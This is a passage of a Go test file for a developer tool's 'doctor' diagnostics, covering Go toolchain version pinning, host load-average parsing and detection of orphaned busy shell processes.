					if strings.Contains(got.remediate, "1.25.6") || strings.Contains(got.detail, "1.25.6") {
						t.Errorf("hostile GO_VERSION reached the output: detail=%q remediate=%q", got.detail, got.remediate)
					}
				})
			}
		}
	}
}

func TestCheckGoToolchainPin_OlderWarns(t *testing.T) {
	stubTool(t, "go", "go version go1.24.3 darwin/arm64", nil)
	dir := pinRepo(t, map[string]string{"go.work": "go 1.25.0\n"})
	assertRung(t, checkGoToolchainPin(dir), "warn", "local go1.24.3 older than the go.work pin go 1.25.0",
		"upgrade Go to go1.25.0", "GOTOOLCHAIN=local")
}

func TestCheckGoToolchainPin_NotOnPATHWarns(t *testing.T) {
	stubTool(t, "go", "", errNotFound("go"))
	dir := pinRepo(t, map[string]string{"go.work": "go 1.25.0\n"})
	assertRung(t, checkGoToolchainPin(dir), "warn", "go not on PATH (go.work pin go 1.25.0)", "install Go 1.25.0")
}

func TestCheckGoToolchainPin_UnparseableWarns(t *testing.T) {
	t.Run("no error", func(t *testing.T) {
		stubTool(t, "go", "gibberish", nil)
		dir := pinRepo(t, map[string]string{"go.work": "go 1.25.0\n"})
		assertRung(t, checkGoToolchainPin(dir), "warn", "`go version` unparseable (go.work pin go 1.25.0)", "GOTOOLCHAIN=go1.25.0")
	})
	t.Run("timeout", func(t *testing.T) {
		stubTool(t, "go", "", errors.New("signal: killed"))
		dir := pinRepo(t, map[string]string{"go.work": "go 1.25.0\n"})
		assertRung(t, checkGoToolchainPin(dir), "warn", "unparseable (go.work pin go 1.25.0): signal: killed")
	})
}

func TestCompareGoMajorMinor(t *testing.T) {
	cases := []struct {
		local, pinned [2]int
		want          int
	}{
		{[2]int{1, 27}, [2]int{1, 25}, 1},
		{[2]int{2, 0}, [2]int{1, 99}, 1},
		{[2]int{1, 24}, [2]int{1, 25}, -1},
		{[2]int{1, 99}, [2]int{2, 0}, -1},
		{[2]int{1, 25}, [2]int{1, 25}, 0},
	}
	for _, tc := range cases {
		if got := compareGoMajorMinor(tc.local, tc.pinned); got != tc.want {
			t.Errorf("compareGoMajorMinor(%v, %v) = %d, want %d", tc.local, tc.pinned, got, tc.want)
		}
	}
}

// ---------------------------------------------------------------------------
// host load
// ---------------------------------------------------------------------------

// loadSources stubs the three load sources and the top-consumers ps call.
type loadSources struct {
	proc, sysctl, uptime, ps string
	procErr, sysErr, upErr   error
	psErr                    error
}

func (s loadSources) stub(t *testing.T) {
	t.Helper()
	withFakeDoctorReadFile(t, func(path string) ([]byte, error) {
		if path != "/proc/loadavg" {
			return nil, fmt.Errorf("unexpected read %s", path)
		}
		if s.procErr != nil {
			return nil, s.procErr
		}
		return []byte(s.proc), nil
	})
	withFakeDoctorEnvRunOutput(t, func(_ time.Duration, _ string, name string, args ...string) (string, error) {
		switch name {
		case "sysctl":
			return s.sysctl, s.sysErr
		case "uptime":
			return s.uptime, s.upErr
		case "ps":
			return s.ps, s.psErr
		}
		return "", fmt.Errorf("unexpected command %s %v", name, args)
	})
}

var errNoSource = errors.New("unavailable")

func TestCheckHostLoad_LoadSources(t *testing.T) {
	cases := []struct {
		name string
		src  loadSources
		want string
	}{
		{"proc/loadavg", loadSources{proc: "3.00 2.00 1.00 1/100 1234"}, "load 3.00 on 10 cores (0.3x)"},
		{"sysctl", loadSources{procErr: errNoSource, sysctl: "{ 7.19 6.83 5.76 }"}, "load 7.19 on 10 cores"},
		{"garbage proc falls to sysctl", loadSources{proc: "nope", sysctl: "{ 1.50 1 1 }"}, "load 1.50"},
		{"uptime macOS comma decimal", loadSources{procErr: errNoSource, sysErr: errNoSource,
			uptime: "17:01  up 2 days, 2 users, load averages: 2,50 1,00 0,50"}, "load 2.50"},
		{"uptime linux", loadSources{procErr: errNoSource, sysctl: "{ x }",
			uptime: " 17:01:02 up 3 days,  load average: 1.25, 1.00, 0.75"}, "load 1.25"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			tc.src.stub(t)
			withFakeDoctorNumCPU(t, 10)
			assertRung(t, checkHostLoad(), "ok", tc.want)
		})
	}
}

func TestCheckHostLoad_UnreadableSkips(t *testing.T) {
	loadSources{procErr: errNoSource, sysErr: errNoSource, upErr: errNoSource}.stub(t)
	withFakeDoctorNumCPU(t, 10)
	assertRung(t, checkHostLoad(), "ok", "skipped — no readable load average")
}

func TestCheckHostLoad_AtThresholdOK(t *testing.T) {
	loadSources{proc: "40.00 1 1"}.stub(t)
	withFakeDoctorNumCPU(t, 10)
	assertRung(t, checkHostLoad(), "ok", "load 40.00 on 10 cores (4.0x)")
}

func TestCheckHostLoad_OverloadedWarns(t *testing.T) {
	loadSources{proc: "41.00 30 20", ps: "  10  0.5 /usr/bin/a\n 777 99.0 /bin/zsh\n  12 45.0 go\nbad row\n  14 99.9\nabc 99.5 junk\n  15 x junk\n" +
		"  13 60.5 /Applications/My App.app/x\n"}.stub(t)
	withFakeDoctorNumCPU(t, 10)
	got := checkHostLoad()
	assertRung(t, got, "warn", "1-min load 41.00 on 10 cores (4.1x, threshold 4.0x); top CPU: pid 777 /bin/zsh 99.0%, pid 13 /Applications/My App.app/x 60.5%, pid 12 go 45.0%",
		"fails on timeouts in packages the diff never touched", "`orphaned shells`", "re-run `fishhawk doctor`")
	if strings.Contains(got.detail, "pid 10 ") {
		t.Errorf("only the top 3 consumers belong in the detail: %q", got.detail)
	}
}

func TestCheckHostLoad_OverloadedWithoutPSOmitsConsumers(t *testing.T) {
	loadSources{proc: "41.00 30 20", psErr: errNoSource}.stub(t)
	withFakeDoctorNumCPU(t, 10)
	got := checkHostLoad()
	assertRung(t, got, "warn", "1-min load 41.00 on 10 cores")
	if strings.Contains(got.detail, "top CPU") {
		t.Errorf("a ps failure must omit the consumers: %q", got.detail)
	}
}

func TestCheckHostLoad_NoCoresDecidesNothing(t *testing.T) {
	loadSources{proc: "500.0 1 1"}.stub(t)
	withFakeDoctorNumCPU(t, 0)
	assertRung(t, checkHostLoad(), "ok", "load 500.00 (core count unavailable, not judged)")
}

// TestDoctorHostLoadFactor_MatchesRunnerHostload pins the duplicated factor to
// its source (binding condition 2): it reads the runner's hostload.go relative
// to the init-captured pkgSrcDir (never runtime.Caller, #4179) and fails
// CLOSED when that file cannot be read.
func TestDoctorHostLoadFactor_MatchesRunnerHostload(t *testing.T) {
	const doctorFile = "cli/cmd/fishhawk/doctor_env.go (doctorHostLoadFactor)"
	const runnerRel = "runner/internal/hostload/hostload.go (DefaultFactor)"
	runnerFile := filepath.Join(pkgSrcDir, "..", "..", "..", "runner", "internal", "hostload", "hostload.go")
	data, err := os.ReadFile(runnerFile) //nolint:gosec // fixed repo-relative path
	if err != nil {
		t.Fatalf("cannot read %s (%s): %v — the parity check between %s and %s fails closed", runnerFile, runnerRel, err, doctorFile, runnerRel)
	}
	if !regexp.MustCompile(`(?m)^const DefaultFactor = 4\.0\s*$`).Match(data) {
		t.Fatalf("%s no longer declares `const DefaultFactor = 4.0`; update %s to the new factor (and this test) so the doctor `host load` rung warns at the same ratio the runner reclassifies a verify as host_overloaded", runnerRel, doctorFile)
	}
	if doctorHostLoadFactor != 4.0 {
		t.Fatalf("%s = %v, but %s declares 4.0; keep the two equal", doctorFile, doctorHostLoadFactor, runnerRel)
	}
}

// ---------------------------------------------------------------------------
// orphaned shells
// ---------------------------------------------------------------------------

func stubPS(t *testing.T, out string, err error) {
	t.Helper()
	withFakeDoctorEnvRunOutput(t, func(_ time.Duration, _ string, name string, args ...string) (string, error) {
		if name != "ps" {
			return "", fmt.Errorf("unexpected command %s %v", name, args)
		}
		return out, err
	})
}

func TestCheckOrphanedShells_PSFailureSkips(t *testing.T) {
	stubPS(t, "", errNotFound("ps"))
	assertRung(t, checkOrphanedShells(), "ok", "skipped — ps unavailable: exec: \"ps\": executable file not found")
	stubPS(t, "header only\nPID PPID %CPU ELAPSED COMM\n  7 1 x 01:00 sh\n  8 1 1.0 bad sh\n  9 1 1.0 01:00\n\n", nil)
	assertRung(t, checkOrphanedShells(), "ok", "skipped — ps unavailable: no parseable rows")
}

func TestCheckOrphanedShells_ParentedShellNotFlagged(t *testing.T) {
	stubPS(t, "4243 4242 99.0 01:00:00 /bin/zsh\n", nil)
	got := checkOrphanedShells()
	assertRung(t, got, "ok", "none (macOS dev-host heuristic")
	for _, want := range []string{"subreaper (systemd --user, tmux)", "inside a container (pid 1 = the entrypoint)", "'none' is not proof"} {
		if !strings.Contains(got.detail, want) {
			t.Errorf("ok detail must carry the heuristic caveat %q: %q", want, got.detail)
		}
	}
}

func TestCheckOrphanedShells_OrphanFlagged(t *testing.T) {
	stubPS(t, "    1     0  0.6 02-21:29:48 /sbin/launchd\n 5150     1 87.5 12:34 -zsh\n", nil)
	got := checkOrphanedShells()
	assertRung(t, got, "warn", "1 busy shell(s) re-parented to pid 1: pid 5150 zsh 87.5% up 12:34",
		"pgrep -fl 'fishhawk-runner --run-id'", "kill 5150", "stage-exit sweep cannot reach it")
	if !strings.Contains(got.detail, "macOS dev-host heuristic") || !strings.Contains(got.detail, "'none' is not proof") {
		t.Errorf("warn detail must carry the heuristic caveat: %q", got.detail)
	}
}

// TestCheckOrphanedShells_AtThresholdsFlagged pins both inclusive bounds: a
// shell at exactly doctorOrphanMinCPU and exactly doctorOrphanMinAge is
// flagged, so tightening either comparison to <= turns it RED.
func TestCheckOrphanedShells_AtThresholdsFlagged(t *testing.T) {
	stubPS(t, "5155 1 50.0 05:00 /bin/sh\n", nil)
	assertRung(t, checkOrphanedShells(), "warn", "1 busy shell(s) re-parented to pid 1: pid 5155 sh 50.0% up 05:00", "kill 5155")
}

func TestCheckOrphanedShells_BelowThresholdsNotFlagged(t *testing.T) {
	for name, row := range map[string]string{
		"idle orphan shell":      "5151 1 0.0 30:00 /bin/bash",
		"just under the CPU bar": "5156 1 49.9 05:00 /bin/sh",
		"young busy orphan":      "5152 1 99.0 04:59 /bin/sh",
		"non-shell busy orphan":  "5153 1 99.0 01:00:00 /usr/bin/python3",
		"busy shell, live owner": "5154 4242 99.0 01:00:00 -bash",
	} {
		t.Run(name, func(t *testing.T) {
			stubPS(t, row+"\n", nil)
			assertRung(t, checkOrphanedShells(), "ok", "none")
		})
	}
}

func TestCheckOrphanedShells_ManyOrphansBounded(t *testing.T) {
	var rows []string
	for i := 0; i < 7; i++ {
		rows = append(rows, fmt.Sprintf("%d 1 90.0 1-02:03:04 /opt/my shells/bash", 6000+i))
	}
	stubPS(t, strings.Join(rows, "\n"), nil)
	got := checkOrphanedShells()
	assertRung(t, got, "warn", "7 busy shell(s) re-parented to pid 1: pid 6000 bash 90.0% up 1-02:03:04", "kill 6000 6001 6002 6003 6004 6005 6006")
	if !strings.Contains(got.detail, "… (2 more)") || strings.Contains(got.detail, "pid 6005") {
		t.Errorf("detail must name 5 orphans and count the rest: %q", got.detail)
	}
}

func TestParseEtime(t *testing.T) {
	cases := []struct {
		in   string
		want time.Duration
		ok   bool
	}{
		{"12:34", 12*time.Minute + 34*time.Second, true},
		{"01:02:03", time.Hour + 2*time.Minute + 3*time.Second, true},
		{"2-01:02:03", 49*time.Hour + 2*time.Minute + 3*time.Second, true},
		{"garbage", 0, false},
		{"1:2:3:4", 0, false},
		{"x-01:02", 0, false},
		{"01:xx", 0, false},
		{"-1:00", 0, false},
		{"1-01:-5", 0, false},
	}
	for _, tc := range cases {
		got, ok := parseEtime(tc.in)
		if ok != tc.ok || got != tc.want {
			t.Errorf("parseEtime(%q) = (%v, %v), want (%v, %v)", tc.in, got, ok, tc.want, tc.ok)
		}
	}
}

func TestIsShellComm(t *testing.T) {
	for comm, want := range map[string]bool{
		"/bin/zsh": true, "-zsh": true, "bash": true, "/usr/bin/dash": true, "ksh": true, "sh": true,
		"/bin/fish": false, "zsh-helper": false, "/usr/bin/python3": false, "": false,
	} {
		if got := isShellComm(comm); got != want {
			t.Errorf("isShellComm(%q) = %v, want %v", comm, got, want)
		}
	}
}
